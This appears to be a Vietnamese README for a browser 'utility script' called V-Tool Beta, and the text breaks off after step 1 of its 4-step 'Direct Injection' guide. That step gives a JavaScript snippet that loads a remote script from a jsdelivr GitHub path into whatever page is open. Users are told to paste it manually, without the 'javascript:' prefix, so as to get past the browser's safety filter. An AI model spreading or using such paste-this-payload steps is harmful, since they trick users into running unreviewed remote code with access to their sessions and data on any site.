<div align="center">

# V-Tool Beta
### Ultimate Utility Script

<p align="center">
  <a href="#">
    <img src="https://img.shields.io/badge/Platform-Mobile%20%26%20Desktop-007AFF?style=for-the-badge&logo=safari&logoColor=white" alt="Mobile Supported">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Status-Active-34C759?style=for-the-badge" alt="Status Active">
  </a>
</p>

</div>

---

## ⚡️ Phương thức kích hoạt (Direct Injection)

Để đảm bảo bảo mật và hoạt động chính xác trên trình duyệt Mobile (Chrome/Safari), vui lòng thực hiện chính xác theo quy trình **4 bước** dưới đây. Hệ thống yêu cầu thao tác thủ công để vượt qua bộ lọc an toàn của trình duyệt.

### 1. Sao chép lõi lệnh (Payload)
Chạm vào nút bên dưới để sao chép đoạn mã. **Lưu ý: Không bao gồm tiền tố `javascript:`**.

```javascript
(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/vyvegroup/VenStorage@main/vtoolbeta.js?t='+Date.now();document.body.appendChild(s);})();
